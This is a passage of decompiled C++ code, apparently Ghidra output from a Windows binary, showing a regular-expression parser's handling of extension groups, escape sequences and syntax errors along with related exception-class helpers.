        local_4c[0] = param_3._3_1_;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                  (local_4c,false);
        sVar8 = strlen(s_ill_formed_regular_expression_0041c27c);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                  (local_4c,s_ill_formed_regular_expression_0041c27c,sVar8);
        local_8 = CONCAT31(local_8._1_3_,1);
        FUN_00404fa7(local_74,local_4c);
        local_74[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
        _CxxThrowException(local_74,(ThrowInfo *)&DAT_004196f8);
      }
      pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar2);
      ppuVar3 = param_1;
      if ((ushort *)
          (-(uint)(*(int *)(pbVar2 + 4) != 0) & *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)) ==
          *param_1) goto LAB_00404d63;
      if (local_20 == (undefined4 *)0x52) {
        puVar6 = FUN_00409008((void **)((int)this + 4));
        *(undefined4 **)param_2[7] = puVar6;
        param_2[7] = puVar6 + 1;
        *(undefined *)((int)this + 10) = 0;
      }
      local_2c = *ppuVar3;
      param_2 = *(undefined4 **)((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 param_2);
      iVar7 = FUN_00406b23(param_3,(byte **)&local_2c,
                           (byte *)(-(uint)(param_2[1] != 0) & param_2[2] + param_2[1]));
      if (iVar7 == 2) {
        *ppuVar3 = local_2c;
        goto LAB_00404e17;
      }
      switch(local_20) {
      case (undefined4 *)0x4a:
        FUN_004079c9((void *)((int)this + 0x43),&param_2,*(void ***)((int)this + 0x47),piVar1);
        puVar6 = (undefined4 *)FUN_0040507f(*(void **)((int)this + 4),0x30);
        local_8._0_1_ = 2;
        param_2 = puVar6;
        if (puVar6 == (undefined4 *)0x0) {
          local_20 = (undefined4 *)0x0;
        }
        else {
          iVar7 = *piVar1;
          *piVar1 = iVar7 + 1;
          FUN_00407aa7(puVar6,iVar7,(undefined4 *)((int)this + 4));
          local_8._0_1_ = 3;
          FUN_00407cf5(puVar6 + 9,puVar6);
          *puVar6 = &DAT_00417758;
          local_20 = puVar6;
        }
        local_8 = (uint)local_8._1_3_ << 8;
        local_24._0_1_ = local_20 != (undefined4 *)0x0;
        FUN_0040bf91(local_18,(char *)&local_24);
        puVar6 = &local_24;
        break;
      case (undefined4 *)0x4b:
        puVar6 = (undefined4 *)FUN_0040507f(*(void **)((int)this + 4),0x39);
        local_8._0_1_ = 6;
        param_2 = puVar6;
        if (puVar6 == (undefined4 *)0x0) {
          local_20 = (undefined4 *)0x0;
        }
        else {
          FUN_00407d96(puVar6,1,(undefined4 *)((int)this + 4));
          *puVar6 = &DAT_004176e0;
          local_20 = puVar6;
        }
        local_8 = (uint)local_8._1_3_ << 8;
        local_24._0_1_ = local_20 != (undefined4 *)0x0;
        FUN_0040bf91(local_18,(char *)&local_24);
        puVar6 = &local_24;
        break;
      case (undefined4 *)0x4c:
        puVar6 = (undefined4 *)FUN_0040507f(*(void **)((int)this + 4),0x39);
        local_8._0_1_ = 7;
        param_2 = puVar6;
        if (puVar6 == (undefined4 *)0x0) {
          local_20 = (undefined4 *)0x0;
        }
        else {
          FUN_00407d96(puVar6,0,(undefined4 *)((int)this + 4));
          *puVar6 = &DAT_004176e0;
          local_20 = puVar6;
        }
        local_8 = (uint)local_8._1_3_ << 8;
        local_24._0_1_ = local_20 != (undefined4 *)0x0;
        FUN_0040bf91(local_18,(char *)&local_24);
        puVar6 = &local_24;
        break;
      case (undefined4 *)0x4d:
        puVar6 = (undefined4 *)FUN_0040507f(*(void **)((int)this + 4),0x35);
        local_8._0_1_ = 8;
        param_2 = puVar6;
        if (puVar6 == (undefined4 *)0x0) {
          local_20 = (undefined4 *)0x0;
        }
        else {
          FUN_00407e41(puVar6,1,(undefined4 *)((int)this + 4));
          local_8._0_1_ = 9;
          FUN_00407916((undefined4 *)((int)puVar6 + 0x2d));
          *puVar6 = &DAT_004176a4;
          local_20 = puVar6;
        }
        local_8 = (uint)local_8._1_3_ << 8;
        local_24._0_1_ = local_20 != (undefined4 *)0x0;
        FUN_0040bf91(local_18,(char *)&local_24);
        puVar6 = &local_24;
        break;
      case (undefined4 *)0x4e:
        puVar6 = (undefined4 *)FUN_0040507f(*(void **)((int)this + 4),0x35);
        local_8._0_1_ = 10;
        param_2 = puVar6;
        if (puVar6 == (undefined4 *)0x0) {
          local_20 = (undefined4 *)0x0;
        }
        else {
          FUN_00407e41(puVar6,0,(undefined4 *)((int)this + 4));
          local_8._0_1_ = 0xb;
          FUN_00407916((undefined4 *)((int)puVar6 + 0x2d));
          *puVar6 = &DAT_004176a4;
          local_20 = puVar6;
        }
        local_8 = (uint)local_8._1_3_ << 8;
        local_24._0_1_ = local_20 != (undefined4 *)0x0;
        FUN_0040bf91(local_18,(char *)&local_24);
        puVar6 = &local_24;
        break;
      case (undefined4 *)0x4f:
        FUN_004079c9((void *)((int)this + 0x43),&param_2,*(void ***)((int)this + 0x47),piVar1);
        puVar6 = (undefined4 *)FUN_0040507f(*(void **)((int)this + 4),0x39);
        local_8._0_1_ = 4;
        param_2 = puVar6;
        if (puVar6 == (undefined4 *)0x0) {
          local_20 = (undefined4 *)0x0;
        }
        else {
          iVar7 = *piVar1;
          *piVar1 = iVar7 + 1;
          FUN_00407e19(puVar6,iVar7,(undefined4 *)((int)this + 4));
          local_8._0_1_ = 5;
          FUN_00407e96((void *)((int)puVar6 + 0x2d),puVar6);
          *puVar6 = &DAT_0041771c;
          local_20 = puVar6;
        }
        local_8 = (uint)local_8._1_3_ << 8;
        local_24._0_1_ = local_20 != (undefined4 *)0x0;
        FUN_0040bf91(local_18,(char *)&local_24);
        puVar6 = &local_24;
        break;
      case (undefined4 *)0x50:
        while( true ) {
          pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **
                    )((int)this + 0x27);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                    (pbVar2);
          iVar7 = FUN_00406b23(param_3,(byte **)ppuVar3,
                               (byte *)(-(uint)(*(int *)(pbVar2 + 4) != 0) &
                                       *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)));
          if (iVar7 == 2) break;
          if (iVar7 == 0) {
            pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       **)((int)this + 0x27);
            std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
            _Freeze(pbVar2);
            if ((ushort *)
                (-(uint)(*(int *)(pbVar2 + 4) != 0) & *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4))
                != *ppuVar3) {
              *ppuVar3 = (ushort *)((int)*ppuVar3 + 1);
            }
          }
          pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **
                    )((int)this + 0x27);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                    (pbVar2);
          if ((ushort *)
              (-(uint)(*(int *)(pbVar2 + 4) != 0) & *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)) ==
              *ppuVar3) {
            local_94[0] = param_3._3_1_;
            std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                      (local_94,false);
            sVar8 = strlen(s_Expecting_end_of_comment_0041c29c);
            std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
            assign(local_94,s_Expecting_end_of_comment_0041c29c,sVar8);
            local_8 = CONCAT31(local_8._1_3_,0xe);
            FUN_00404fa7(local_d0,local_94);
            local_d0[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
            _CxxThrowException(local_d0,(ThrowInfo *)&DAT_004196f8);
          }
        }
        goto LAB_00404e17;
      case (undefined4 *)0x51:
        local_19 = '\x01';
        FUN_004079c9((void *)((int)this + 0x43),&param_2,*(void ***)((int)this + 0x47),piVar1);
        pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (pbVar2);
        uVar9 = FUN_004090ff((char **)param_1,
                             (char *)(-(uint)(*(int *)(pbVar2 + 4) != 0) &
                                     *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)),0xffffffff);
        if (uVar9 != 0) {
          pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **
                    )((int)this + 0x27);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                    (pbVar2);
          iVar7 = FUN_00406b23(param_3,(byte **)param_1,
                               (byte *)(-(uint)(*(int *)(pbVar2 + 4) != 0) &
                                       *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)));
          if (iVar7 == 2) {
            iVar7 = *piVar1;
            *piVar1 = iVar7 + 1;
            local_20 = FUN_00409146(iVar7,1,(void **)((int)this + 4));
            local_24._0_1_ = local_20 != (undefined4 *)0x0;
            FUN_0040bf91(local_18,(char *)&local_24);
            puVar6 = &local_24;
            break;
          }
        }
        pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x27);
        local_2c = *param_1;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (pbVar2);
        iVar7 = FUN_00406d0a(param_3,(char **)&local_2c,
                             (char *)(-(uint)(*(int *)(pbVar2 + 4) != 0) &
                                     *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)));
        if ((iVar7 < 0x4b) || (0x4e < iVar7)) {
          local_84[0] = param_3._3_1_;
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_84,false);
          sVar8 = strlen(s_bad_extension_sequence_0041c2b8);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                    (local_84,s_bad_extension_sequence_0041c2b8,sVar8);
          local_8 = CONCAT31(local_8._1_3_,0xd);
          FUN_00404fa7(local_b4,local_84);
          local_b4[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
          _CxxThrowException(local_b4,(ThrowInfo *)&DAT_004196f8);
        }
        uStack_34 = FUN_00404705(this,param_1,(undefined4 *)0x0,param_3,param_4);
        iVar7 = *piVar1;
        local_8._0_1_ = 0xc;
        *piVar1 = iVar7 + 1;
        uStack_38._0_1_ = uStack_34 != (int *)0x0;
        local_20 = (undefined4 *)FUN_004091be(iVar7,uStack_34,(int)this + 4);
        local_24._0_1_ = local_20 != (undefined4 *)0x0;
        FUN_0040bf91(local_18,(char *)&local_24);
        FUN_00406ed3((char *)&local_24);
        uStack_38 = (uint)uStack_38._1_3_ << 8;
        local_8 = (uint)local_8._1_3_ << 8;
        puVar6 = &uStack_38;
        break;
      default:
        local_4c[0] = param_3._3_1_;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                  (local_4c,false);
        sVar8 = strlen(s_bad_extension_sequence_0041c2b8);
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                  (local_4c,s_bad_extension_sequence_0041c2b8,sVar8);
        local_8 = CONCAT31(local_8._1_3_,0xf);
        FUN_00404fa7(local_74,local_4c);
        local_74[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
        _CxxThrowException(local_74,(ThrowInfo *)&DAT_004196f8);
      }
      FUN_00406ed3((char *)puVar6);
      goto LAB_00404e17;
    }
  }
  uStack_34 = (int *)FUN_0040507f(*(void **)((int)this + 4),0x30);
  local_8._0_1_ = 0x10;
  param_2 = uStack_34;
  if (uStack_34 == (int *)0x0) {
    uStack_34 = (int *)0x0;
  }
  else {
    iVar7 = *piVar1;
    *piVar1 = iVar7 + 1;
    FUN_00407aa7(uStack_34,iVar7,(undefined4 *)((int)this + 4));
    local_8._0_1_ = 0x11;
    FUN_00407cf5(uStack_34 + 9,uStack_34);
    *uStack_34 = (int)&DAT_00417758;
  }
  local_8 = (uint)local_8._1_3_ << 8;
  uStack_38 = CONCAT31(uStack_38._1_3_,uStack_34 != (int *)0x0);
  FUN_0040bf91(local_18,(char *)&uStack_38);
  FUN_00406ed3((char *)&uStack_38);
  *(int *)((int)this + 0xf) = *(int *)((int)this + 0xf) + 1;
LAB_00404e17:
  if (local_14 != (int *)0x0) {
    FUN_00406f41((int)local_14);
    do {
      cVar5 = FUN_004050b8(this,param_1,local_14,param_3,param_4);
    } while (cVar5 != '\0');
    puVar6 = (undefined4 *)FUN_00406f61(local_14,&local_28,(void **)((int)this + 4));
    local_3c = *puVar6;
    uStack_38 = puVar6[1];
    uStack_34 = (int *)puVar6[2];
    uStack_30 = *(undefined *)(puVar6 + 3);
    if ((local_19 != '\0') && (uVar9 = FUN_00407cc2((int)(local_14 + 2)), 2 < uVar9)) {
      local_4c[0] = param_3._3_1_;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_4c,false);
      sVar8 = strlen(s_Too_many_alternates_in_condition_0041c248);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                (local_4c,s_Too_many_alternates_in_condition_0041c248,sVar8);
      local_8 = CONCAT31(local_8._1_3_,0x12);
      FUN_00404fa7(local_74,local_4c);
      local_74[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
      _CxxThrowException(local_74,(ThrowInfo *)&DAT_004196f8);
    }
    if (((char)local_3c != '\0') && (local_14[4] == 0)) {
      param_1 = (ushort **)FUN_0040507f(*(void **)((int)this + 4),0x10d);
      local_8._0_1_ = 0x13;
      if (param_1 == (ushort **)0x0) {
        uVar10 = 0;
      }
      else {
        uVar10 = FUN_004074e9(param_1,CONCAT13((undefined)uStack_38,local_3c._1_3_),
                              CONCAT13((undefined)uStack_34,uStack_38._1_3_),
                              CONCAT13(uStack_30,uStack_34._1_3_));
      }
      local_8 = (uint)local_8._1_3_ << 8;
      *(undefined4 *)((int)this + 0x4f) = uVar10;
    }
    pvVar4 = param_4;
    if (local_14[4] != 0xffffffff) {
      if ((*(int *)((int)param_4 + 4) == 0) ||
         ((uint)(*(int *)((int)param_4 + 8) - *(int *)((int)param_4 + 4) >> 2) <= (uint)local_14[4])
         ) {
        param_1 = (ushort **)0x0;
        FUN_00407584(param_4,local_14[4] + 1,&param_1);
      }
      *(int **)(*(int *)((int)pvVar4 + 4) + local_14[4] * 4) = local_14;
    }
    uStack_38 = local_50;
    uStack_34 = (int *)(*local_58 - local_50);
    (**(code **)(*local_14 + 0x34))(&uStack_38);
    *param_3 = local_54;
  }
  piVar1 = local_14;
  local_18[0] = '\0';
  local_8 = 0xffffffff;
  FUN_00406ed3(local_18);
  ExceptionList = local_10;
  return piVar1;
}



undefined4 * __thiscall
FUN_00404fa7(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1)

{
  std::logic_error::logic_error((logic_error *)this,param_1);
  *(undefined **)this = &DAT_00417794;
  return (undefined4 *)this;
}



void __fastcall FUN_00404fc0(logic_error *param_1)

{
  undefined local_20 [28];
  
  FUN_0040503f(local_20,param_1);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_20,(ThrowInfo *)&DAT_004197d8);
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __fastcall FUN_00404fdd(undefined **param_1)

{
  void *pvStack_10;
  undefined *puStack_c;
  undefined4 uStack_8;
  
  puStack_c = &LAB_00415abd;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  *param_1 = &DAT_00417794;
  *param_1 = _vftable__exref;
  uStack_8 = 0;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             (param_1 + 3),true);
  uStack_8 = 0xffffffff;
  exception::~exception((exception *)param_1);
  ExceptionList = pvStack_10;
  return;
}



void __fastcall FUN_00404fe8(undefined **param_1)

{
  int unaff_EBP;
  
  *(undefined ***)(unaff_EBP + -0x10) = param_1;
  *param_1 = &DAT_00417794;
  *param_1 = _vftable__exref;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             (param_1 + 3),true);
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  exception::~exception((exception *)param_1);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



undefined ** __thiscall FUN_00405023(void *this,byte param_1)

{
  FUN_00404fdd((undefined **)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined **)this;
}



undefined4 * __thiscall FUN_0040503f(void *this,logic_error *param_1)

{
  std::logic_error::logic_error((logic_error *)this,param_1);
  *(undefined **)this = &DAT_00417794;
  return (undefined4 *)this;
}



void __fastcall FUN_00405058(undefined **param_1)

{
  *param_1 = &DAT_00417698;
  FUN_00404fdd(param_1);
  return;
}



undefined ** __thiscall FUN_00405063(void *this,byte param_1)

{
  FUN_00405058((undefined **)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined **)this;
}



int __thiscall FUN_0040507f(void *this,uint param_1)

{
  int *piVar1;
  int iVar2;
  
  if (param_1 == 0) {
    param_1 = 1;
  }
  if ((*(int **)((int)this + 1) == (int *)0x0) ||
     (*(uint *)((int)this + 5) < **(int **)((int)this + 1) + param_1)) {
    FUN_0040684b(this,param_1);
  }
  piVar1 = *(int **)((int)this + 1);
  iVar2 = *piVar1;
  *piVar1 = iVar2 + param_1;
  return iVar2 + 0xc + (int)piVar1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined __thiscall
FUN_004050b8(void *this,ushort **param_1,int *param_2,uint *param_3,void *param_4)

{
  byte bVar1;
  char cVar2;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar3;
  ushort *puVar4;
  ushort **ppuVar5;
  uint *puVar6;
  size_t sVar7;
  int iVar8;
  undefined **pExceptionObject;
  undefined4 uVar9;
  undefined *puVar10;
  uint uVar11;
  undefined4 *puVar12;
  byte bVar13;
  undefined uVar14;
  bool bVar15;
  void **ppvVar16;
  undefined *local_f4 [7];
  undefined *local_d8 [7];
  undefined *local_bc [7];
  undefined *local_a0 [7];
  undefined *local_84 [3];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_78 [16];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_68 [16];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_58 [16];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_48 [16];
  undefined4 local_38;
  char local_34 [4];
  int local_30;
  ushort *local_2c;
  char local_28 [4];
  int local_24;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_20 [8];
  char local_18 [4];
  int *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puVar6 = param_3;
  ppuVar5 = param_1;
  puStack_c = &LAB_00415b17;
  local_10 = ExceptionList;
  local_28[0] = '\0';
  local_24 = 0;
  local_34[0] = '\0';
  local_30 = 0;
  local_38 = local_38 & 0xffffff00;
  pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  local_8._0_1_ = 1;
  local_8._1_3_ = 0;
  bVar15 = (*param_3 & 0x100) != 0x100;
  ExceptionList = &local_10;
  local_14 = (int *)this;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar3)
  ;
  if ((ushort *)(-(uint)(*(int *)(pbVar3 + 4) != 0) & *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4))
      == *param_1) {
    if (param_2[4] == 0) {
      local_8 = (uint)local_8._1_3_ << 8;
      FUN_0040c5ed(local_34);
      local_8 = 0xffffffff;
      FUN_00406ed3(local_28);
      ExceptionList = local_10;
      return 0;
    }
    local_20[0] = param_2._3_1_;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_20,false);
    sVar7 = strlen(s_mismatched_parenthesis_0041c320);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (local_20,s_mismatched_parenthesis_0041c320,sVar7);
    local_8 = CONCAT31(local_8._1_3_,2);
    FUN_00404fa7(local_84,local_20);
    local_84[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_84,(ThrowInfo *)&DAT_004196f8);
  }
  pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar3)
  ;
  iVar8 = FUN_00406b23(param_3,(byte **)param_1,
                       (byte *)(-(uint)(*(int *)(pbVar3 + 4) != 0) &
                               *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4)));
  switch(iVar8) {
  case 0:
    pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar3);
    if ((ushort *)(-(uint)(*(int *)(pbVar3 + 4) != 0) & *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4))
        != *param_1) {
      FUN_00405eea(this,(byte **)param_1,(int)param_2,param_3);
      goto LAB_004052d1;
    }
    if (param_2[4] != 0) {
      local_68[0] = param_2._3_1_;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_68,false);
      sVar7 = strlen(s_mismatched_parenthesis_0041c320);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                (local_68,s_mismatched_parenthesis_0041c320,sVar7);
      local_8 = CONCAT31(local_8._1_3_,3);
      FUN_00404fa7(local_a0,local_68);
      local_a0[0] = &DAT_00417698;
      pExceptionObject = local_a0;
      goto LAB_00405245;
    }
    goto LAB_0040524b;
  case 1:
    local_14 = FUN_00404705(this,param_1,param_2,param_3,param_4);
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    FUN_00406ed3(local_18);
    local_38 = CONCAT31(local_38._1_3_,1);
    goto switchD_004051c2_caseD_9;
  case 2:
    if (param_2[4] == 0) {
      local_48[0] = param_2._3_1_;
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (local_48,false);
      sVar7 = strlen(s_mismatched_parenthesis_0041c320);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                (local_48,s_mismatched_parenthesis_0041c320,sVar7);
      local_8 = CONCAT31(local_8._1_3_,4);
      FUN_00404fa7(local_d8,local_48);
      local_d8[0] = &DAT_00417698;
      pExceptionObject = local_d8;
LAB_00405245:
                    // WARNING: Subroutine does not return
      _CxxThrowException(pExceptionObject,(ThrowInfo *)&DAT_004196f8);
    }
LAB_0040524b:
    uVar14 = 0;
LAB_004052d3:
    local_8 = (uint)local_8._1_3_ << 8;
    FUN_0040c5ed(local_34);
    local_8 = 0xffffffff;
    FUN_00406ed3(local_28);
    ExceptionList = local_10;
    return uVar14;
  case 3:
    uVar9 = (**(code **)(*param_2 + 0x38))();
    *(undefined4 *)param_2[7] = uVar9;
    FUN_00406f41((int)param_2);
LAB_004052d1:
    uVar14 = 1;
    goto LAB_004052d3;
  case 4:
    local_14 = FUN_00409233(*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 5:
    local_14 = FUN_0040927c(*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 6:
    puVar12 = (undefined4 *)FUN_0040507f(*(void **)((int)this + 4),0x40);
    local_8._0_1_ = 5;
    if (puVar12 == (undefined4 *)0x0) {
      puVar12 = (undefined4 *)0x0;
    }
    else {
      FUN_00405de3(puVar12,(int)this + 4);
      *puVar12 = &DAT_004177a0;
    }
    local_18[0] = puVar12 != (undefined4 *)0x0;
    local_8._0_1_ = 1;
    local_14 = puVar12;
    FUN_0040bfd3(local_34,local_18);
    FUN_0040c5ed(local_18);
    pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar3);
    FUN_004092c5((int)local_34,param_1,
                 (ushort *)
                 (-(uint)(*(int *)(pbVar3 + 4) != 0) & *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4)),
                 param_3);
    local_14 = FUN_00409941((void *)((int)this + 4),local_30,*param_3,
                            (void **)(void *)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    FUN_00406ed3(local_18);
    local_34[0] = '\0';
    goto switchD_004051c2_caseD_9;
  case 7:
    local_14 = FUN_004099fb(*param_3,(void **)((int)this + 4));
    local_18[0] = local_14 != (int *)0x0;
    FUN_0040bf91(local_28,local_18);
    break;
  case 8:
    pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar3);
    iVar8 = *(int *)(pbVar3 + 4);
    puVar4 = *param_1;
    if ((ushort *)(-(uint)(iVar8 != 0) & *(int *)(pbVar3 + 8) + iVar8) != puVar4) {
      cVar2 = *(char *)puVar4;
      if ((cVar2 < '0') || ('9' < cVar2)) {
        if (cVar2 == 'e') {
          *param_1 = (ushort *)((int)puVar4 + 1);
          local_14 = FUN_00409bc5('\x1b',*param_3,(void **)((int)this + 4));
          local_18[0] = local_14 != (int *)0x0;
          FUN_0040bf91(local_28,local_18);
        }
        else if (cVar2 == 'x') {
          param_1 = (ushort **)0x0;
          param_3 = (uint *)0x0;
          *ppuVar5 = (ushort *)((int)puVar4 + 1);
          do {
            pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       **)((int)this + 0x27);
            std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
            _Freeze(pbVar3);
            bVar13 = (byte)param_1;
            if (((ushort *)
                 (-(uint)(*(int *)(pbVar3 + 4) != 0) & *(int *)(pbVar3 + 8) + *(int *)(pbVar3 + 4))
                 == *ppuVar5) ||
               ((((cVar2 = *(char *)*ppuVar5, cVar2 < '0' || ('9' < cVar2)) &&
                 ((cVar2 < 'a' || ('f' < cVar2)))) && ((cVar2 < 'A' || ('F' < cVar2)))))) break;
            iVar8 = FUN_00402fbd(cVar2);
            bVar13 = (char)iVar8 + (byte)param_1 * '\x10';
            bVar1 = param_3._3_1_ + 1;
            param_3 = (uint *)((uint)bVar1 << 0x18);
            *ppuVar5 = (ushort *)((int)*ppuVar5 + 1);
            param_1 = (ushort **)(uint)bVar13;
          } while ((char)bVar1 < '\x02');
          param_1._0_1_ = bVar13;
          local_14 = FUN_00409bc5((byte)param_1,*puVar6,(void **)((int)this + 4));
          local_18[0] = local_14 != (int *)0x0;
          FUN_0040bf91(local_28,local_18);
        }
        else if (cVar2 == 'c') {
          pbVar3 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **
                    )((int)this + 0x27);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                    (pbVar3);
          iVar8 = *(int *)(pbVar3 + 4);
          *param_1 = (ushort *)((int)*param_1 + 1);
          puVar4 = *param_1;
          if ((ushort *)(-(uint)(iVar8 != 0) & *(int *)(pbVar3 + 8) + iVar8) == puVar4) {
            local_58[0] = param_2._3_1_;
            std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                      (local_58,false);
            sVar7 = strlen(s_incomplete_escape_sequence__c_0041c300);
            std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
            assign(local_58,s_incomplete_escape_sequence__c_0041c300,sVar7);
            local_8 = CONCAT31(local_8._1_3_,6);
            FUN_00404fa7(local_bc,local_58);
            local_bc[0] = &DAT_00417698;
                    // WARNING: Subroutine does not return
            _CxxThrowException(local_bc,(ThrowInfo *)&DAT_004196f8);
          }
          bVar13 = *(byte *)puVar4;
          *param_1 = (ushort *)((int)puVar4 + 1);
          if (('`' < (char)bVar13) && ((char)bVar13 < '{')) {
            iVar8 = toupper((int)(char)bVar13);
            bVar13 = (byte)iVar8;
          }
          local_14 = FUN_00409bc5(bVar13 ^ 0x40,*param_3,(void **)((int)this + 4));
          local_18[0] = local_14 != (int *)0x0;
          FUN_0040bf91(local_28,local_18);
        }
        else if ((cVar2 != 'a') || (bVar15)) {
          if ((cVar2 != 'f') || (bVar15)) {
            if ((cVar2 != 'n') || (bVar15)) {
              if ((cVar2 != 'r') || (bVar15)) {
                if ((cVar2 != 't') || (bVar15)) {
                  if ((cVar2 != '\\') || (bVar15)) {
                    puVar12 = FUN_00409cbb(CONCAT31((int3)((uint)iVar8 >> 8),cVar2),param_3);
                    if (puVar12 == (undefined4 *)0x0) {
                      local_14 = FUN_00409bc5(*(char *)*param_1,*param_3,(void **)((int)this + 4));
                      local_18[0] = local_14 != (int *)0x0;
                      FUN_0040bf91(local_28,local_18);
                    }
                    else {
                      local_14 = FUN_00409b0f(puVar12,*param_3,(void **)((int)this + 4));
